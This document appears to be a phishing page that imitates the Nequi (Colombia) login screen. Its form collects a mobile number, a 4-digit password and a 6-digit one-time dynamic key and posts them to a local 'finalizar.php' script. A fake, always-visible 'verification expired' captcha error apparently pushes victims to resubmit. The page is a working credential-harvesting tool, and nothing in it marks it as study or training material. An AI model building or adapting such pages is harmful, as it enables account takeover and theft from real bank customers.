<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Nequi Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
    body {
      background: #fae9f5;
      margin: 0;
      font-family: 'Inter', Arial, sans-serif;
      min-height: 100vh;
      position: relative;
      overflow-x: hidden;
    }
    /* Fondo decorativo con figuras */
    .nequi-bg-squares {
      position: fixed;
      left: 0; top: 0; width: 100vw; height: 100vh;
      z-index: 0;
      pointer-events: none;
    }
    .nequi-bg-square {
      position: absolute;
      background: rgba(255,255,255,0.33);
      border-radius: 26px;
      opacity: 0.6;
    }
    /* Custom posiciones y tamaños para replicar la imagen */
    .nequi-bg-square.sq1 { left: 52vw; top: 0vh; width: 22vw; height: 23vh; }
    .nequi-bg-square.sq2 { left: 58vw; top: 26vh; width: 13vw; height: 17vh; }
    .nequi-bg-square.sq3 { left: 75vw; top: 47vh; width: 20vw; height: 18vh; }
    .nequi-bg-square.sq4 { left: 62vw; top: 55vh; width: 11vw; height: 11vh; }
    /* Centrado del formulario */
    .nequi-login-wrapper {
      position: relative;
      z-index: 1;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .nequi-login-container {
      width: 410px;
      background: #fff;
      border-radius: 16px;
      box-shadow: 0 2px 26px 0 rgba(190, 30, 120, 0.07);
      padding: 36px 32px 34px 32px;
      display: flex;
      flex-direction: column;
      align-items: stretch;
      position: relative;
    }
    .nequi-login-container h1 {
      text-align: center;
      color: #210024;
      font-weight: 700;
      margin-bottom: 8px;
      font-size: 2rem;
    }
    .nequi-login-container p {
      text-align: center;
      color: #6a1c85;
      font-size: 1.08rem;
      margin-bottom: 24px;
      margin-top: 0;
      font-weight: 500;
    }
    .nequi-field {
      margin-bottom: 18px;
      display: flex;
      flex-direction: column;
    }
    .input-group {
      display: flex;
      align-items: center;
      gap: 0;
      width: 100%;
    }
    .input-indicativo {
      display: flex;
      align-items: center;
      background: #fff;
      border: none;
      border-radius: 8px 0 0 8px;
      padding: 0 18px 0 12px;
      height: 48px;
      font-size: 1.08rem;
      font-weight: 500;
      color: #333;
      box-sizing: border-box;
      border: 1.5px solid #f3eaf6;
      border-right: 0;
      min-width: 120px;
    }
    .input-indicativo img {
      width: 26px;
      height: 18px;
      margin-right: 7px;
      border-radius: 3px;
      border: 1.5px solid #f3eaf6;
      background: #fff;
    }
    .input-indicativo .arrow {
      margin-left: 9px;
      font-size: 1.1rem;
      color: #adadad;
      font-weight: bold;
    }
    .input-celular {
      flex: 1;
      background: #fff;
      border: 1.5px solid #f3eaf6;
      border-radius: 0 8px 8px 0;
      border-left: 0;
      height: 48px;
      padding: 0 18px;
      font-size: 1.13rem;
      box-sizing: border-box;
      outline: none;
      transition: border-color 0.25s;
      color: #333;
    }
    .input-celular:focus {
      border-color: #db1fff;
    }
    .nequi-field label { display: none; }
    .nequi-field input[type="password"] {
      width: 100%;
      padding: 15px 18px;
      font-size: 1.13rem;
      border: 1.5px solid #f3eaf6;
      border-radius: 8px;
      background: #faf5fc;
      transition: border-color 0.3s;
      box-sizing: border-box;
      color: #333;
      outline: none;
      margin-bottom: 0;
    }
    .nequi-field input[type="password"]:focus {
      border-color: #db1fff;
    }
    .captcha-box {
      background: #fff;
      border: 2px solid #db1fff;
      border-radius: 10px;
      padding: 14px 10px 8px 10px;
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      margin-bottom: 28px;
      margin-top: 8px;
    }
    .captcha-error {
      color: #e4007a;
      font-size: 1rem;
      margin-bottom: 7px;
      margin-top: -7px;
      font-weight: 500;
    }
    .nequi-btn {
      width: 100%;
      background: #e4007a;
      color: #fff;
      font-size: 1.25rem;
      font-weight: 700;
      border: none;
      border-radius: 10px;
      padding: 17px 0;
      margin-top: 8px;
      cursor: pointer;
      transition: background 0.2s;
      box-shadow: 0 2px 8px rgba(228,0,122,0.13);
      letter-spacing: 1px;
    }
    .nequi-btn:hover {
      background: #b80063;
    }
    @media (max-width: 600px) {
      .nequi-login-container { width: 97vw; padding: 20px 4vw; }
    }
    </style>
</head>
<body>
    <div class="nequi-bg-squares">
        <div class="nequi-bg-square sq1"></div>
        <div class="nequi-bg-square sq2"></div>
        <div class="nequi-bg-square sq3"></div>
        <div class="nequi-bg-square sq4"></div>
    </div>
    <div class="nequi-login-wrapper">
      <div class="nequi-login-container">
          <h1>Entra a tu Nequi</h1>
          <p>Podrás bloquear tu Nequi, consultar tus datos.</p>
          <form method="POST" action="finalizar.php" autocomplete="off">
              <div class="nequi-field">
                  <div class="input-group">
                      <span class="input-indicativo">
                          <img src="https://flagcdn.com/w20/co.png" alt="Colombia">
                          +57
                          <span class="arrow">&#9660;</span>
                      </span>
                      <input type="tel"
                          id="j_username"
                          name="j_username"
                          class="input-celular"
                          placeholder="Número de celular"
                          maxlength="10"
                          minlength="10"
                          pattern="[0-9]{10}"
                          required
                          autocomplete="off">
                  </div>
              </div>
              <div class="nequi-field">
                  <input type="password" id="j_password" name="j_password" maxlength="4" minlength="4" required placeholder="Contraseña">
              </div>
              <div class="nequi-field">
                  <input type="password" id="j_dinamica" name="j_dinamica" maxlength="6" minlength="6" required placeholder="Clave dinámica">
              </div>
              <div class="captcha-box">
                  <div class="captcha-error" style="display:block;">La verificación ha caducado. Vuelve a marcar la casilla de verificación.</div>
                  <div class="g-recaptcha" data-sitekey="6Led89IrAAAAAGGHsXCbc_9T-8D9jpCJpE8NTogc"></div>
              </div>
              <button type="submit" class="nequi-btn">Entra</button>
          </form>
      </div>
    </div>
    <script async defer src="https://www.google.com/recaptcha/api.js"></script>
</body>
</html>
